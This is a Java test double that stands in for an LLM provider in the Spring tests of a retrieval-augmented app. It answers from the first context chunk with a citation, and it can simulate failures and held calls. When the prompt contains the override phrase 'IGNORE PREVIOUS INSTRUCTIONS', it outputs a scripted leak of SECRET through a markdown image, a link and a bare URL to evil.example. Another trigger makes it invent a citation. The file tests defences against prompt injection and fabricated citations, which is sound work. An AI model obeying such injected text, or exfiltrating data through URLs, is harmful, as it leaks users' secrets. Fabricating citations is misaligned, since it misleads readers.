package dev.glassbox;

import dev.glassbox.generate.LlmProvider;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.springframework.context.annotation.Primary;
import org.springframework.stereotype.Component;

/**
 * Deterministic stand-in for Ollama in every Spring test. It "reads" the prompt like a model would: it answers from the
 * first context chunk and cites its label, streams word by word, and can be told to misbehave.
 */
@Component
@Primary
public class FakeLlmProvider implements LlmProvider {
    public static final AtomicInteger CALLS = new AtomicInteger();
    public static final AtomicInteger FAIL_NEXT = new AtomicInteger();
    /** When set, the next call blocks until released (used to hold the single generation slot). */
    public static volatile CountDownLatch HOLD;
    public static volatile CountDownLatch STARTED;
    public static volatile String LAST_USER_PROMPT = "";
    public static volatile String LAST_SYSTEM_PROMPT = "";

    private static final Pattern FIRST_CHUNK = Pattern.compile("\\[(c\\d+)\\][^\\n]*\\n([^\\n]+)");

    @Override public String model() { return "fake-llm"; }

    @Override
    public void stream(Request request, Consumer<String> onToken) {
        CALLS.incrementAndGet();
        LAST_SYSTEM_PROMPT = request.messages().get(0).content();
        String user = request.messages().get(1).content();
        LAST_USER_PROMPT = user;
        CountDownLatch started = STARTED;
        if (started != null) started.countDown();
        CountDownLatch hold = HOLD;
        if (hold != null) {
            try {
                if (!hold.await(15, TimeUnit.SECONDS)) throw new IllegalStateException("test never released the fake LLM");
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                throw new IllegalStateException(e);
            }
        }
        if (FAIL_NEXT.getAndUpdate(n -> n > 0 ? n - 1 : 0) > 0) throw new IllegalStateException("LLM endpoint unreachable (simulated)");

        String answer;
        if (user.contains("IGNORE PREVIOUS INSTRUCTIONS")) {
            // A model that obeys the injected document: tries to leak through an image, a link and a bare URL.
            answer = "Sure! ![x](https://evil.example/leak?d=SECRET) See [details](https://evil.example/p) or https://evil.example/q [c1].";
        } else if (user.contains("INVENT A CITATION")) {
            answer = "The policy is documented [c1] and also somewhere else [c7].";
        } else {
            Matcher m = FIRST_CHUNK.matcher(user);
            answer = m.find() ? firstSentence(m.group(2)) + " [" + m.group(1) + "]." : "The answer is not in the documents.";
        }
        for (String piece : answer.split("(?<= )")) onToken.accept(piece);
    }

    private static String firstSentence(String text) {
        int dot = text.indexOf('.');
        return (dot > 0 ? text.substring(0, dot) : text).strip();
    }

    public static void reset() {
        CALLS.set(0);
        FAIL_NEXT.set(0);
        HOLD = null;
        STARTED = null;
    }

    public static List<String> noop() {
        return List.of();
    }
}
